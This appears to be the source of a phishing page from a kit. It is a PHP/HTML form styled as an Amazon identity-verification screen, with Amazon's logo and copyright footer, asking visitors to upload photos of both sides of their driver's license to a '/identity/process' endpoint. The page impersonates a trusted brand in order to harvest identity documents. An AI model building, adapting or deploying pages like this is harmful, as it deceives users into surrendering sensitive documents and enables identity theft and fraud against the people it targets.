<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Amazon | Verify</title>

  <!-- Favicon -->
  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/732/732221.png" type="image/png" />

  <!-- CSS CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />

  <style>
    body {
      background-color: #fff;
      font-family: Arial, sans-serif;
    }

    .amazon-nav {
      background-color: #fff;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      position: fixed;
      width: 100%;
      top: 0;
      z-index: 1000;
    }

    .nav-container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 10px 20px;
      height: 60px;
      display: flex;
      align-items: center;
    }

    .logo img {
      height: 40px;
    }

    .card-custom {
      max-width: 500px;
      margin: 120px auto 40px;
      padding: 30px;
      border: 1px solid #eee;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
    }

    .text-center img.icon-selfie {
      width: 70px;
      margin-bottom: 15px;
    }

    .btn-custom {
      background-color: #FFB800;
      border: none;
      width: 100%;
      font-weight: bold;
      padding: 12px;
      border-radius: 50px;
      color: #111;
      transition: background-color 0.3s ease;
    }

    .btn-custom:hover {
      background-color: #f5a700;
      color: #111;
    }

    .btn-custom:disabled {
      background-color: #ffe18d;
      color: #555;
    }

    .progress {
      height: 8px;
    }

    footer {
      text-align: center;
      font-size: 12px;
      color: gray;
      margin-bottom: 30px;
    }
  </style>
</head>

<body>
  <!-- Navigation -->
  <nav class="amazon-nav">
    <div class="nav-container">
      <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
      </div>
    </div>
  </nav>

  <!-- Main Content -->
  <div class="card card-custom">
    <div class="text-center">
      <img class="icon-selfie" src="https://cdn-icons-png.flaticon.com/512/847/847969.png" alt="SSN Icon">
      <h4 class="mb-2">Verify your identity</h4>
      <p class="text-muted mb-4">Please upload the documents requested in the form below.</p>
    </div>

    <form id="uploadForm" action="/identity/process" method="post" style="padding:0 20px" enctype="multipart/form-data" novalidate="on">
      <div class="mb-3">
        <div class="text-muted lb mb-2">Photo of the front driver's license</div>
        <input type="file" class="form-control" accept="image/*" name="file1" id="file1" required>
      </div>

      <div class="mb-3">
        <div class="text-muted lb mb-2">Photo of the back driver's license</div>
        <input type="file" class="form-control" accept="image/*" name="file2" id="file2" required>
      </div>

      <div class="text-center">
        <small class="text-muted">Make sure both images are clear, well-lit, and uncropped.</small>
      </div>

      <div class="d-none mt-3" id="progressContainer">
        <div class="progress">
          <div class="progress-bar bg-success" role="progressbar" style="width: 0%;" id="progressBar"></div>
        </div>
        <div class="mt-2 text-center" id="statusText"></div>
      </div>

      <div class="mt-4">
        <button id="submitBtn" type="submit" class="btn btn-custom" disabled>Continue</button>
      </div>
    </form>
  </div>

  <!-- Footer -->
  <footer>
    &copy; 2025 Amazon Inc. All rights reserved.
  </footer>

  <!-- Scripts -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function() {
      function handleFileUpload() {
        var formData = new FormData();

        var file1 = $('#file1')[0].files[0];
        var file2 = $('#file2')[0].files[0];
        var errorMessage = $('#errorMessage');

        if (!file1 || !file2) {
          errorMessage.text("[Err x2039] Please select both files as required before uploading.");
          errorMessage.show();
          return;
        } else {
          errorMessage.hide();
        }

        formData.append('file1', file1);
        formData.append('file2', file2);

        var progressContainer = $('#progressContainer');
        var progressBar = $('#progressBar');
        var statusText = $('#statusText');

        progressContainer.removeClass('d-none');

        $.ajax({
          xhr: function() {
            var xhr = new XMLHttpRequest();
            xhr.upload.addEventListener('progress', function(e) {
              if (e.lengthComputable) {
                var percentComplete = Math.round((e.loaded / e.total) * 100);
                progressBar.css('width', percentComplete + '%');
                statusText.text('Uploading: ' + percentComplete + '% completed');
              }
            });
            return xhr;
          },
          type: 'POST',
          url: $('#uploadForm').attr('action'),
          data: formData,
          processData: false,
          contentType: false,
          success: function(response) {
            progressBar.css('width', '100%');
            statusText.text('Upload complete!');
          },
          error: function(xhr, status, error) {
            statusText.text('An error occurred: ' + error);
          }
        });
      }

      $('#uploadButton').on('click', function(event) {
        event.preventDefault();
        handleFileUpload();
      });

      $('#uploadForm').on('submit', function(event) {});
    });

    $('#file1, #file2').on('change', function() {
      if ($('#file1').val() === "" || $('#file2').val() === "") {
        $('#submitBtn').prop('disabled', true);
      } else {
        $('#submitBtn').prop('disabled', false);
      }
    });
  </script>
</body>

</html>
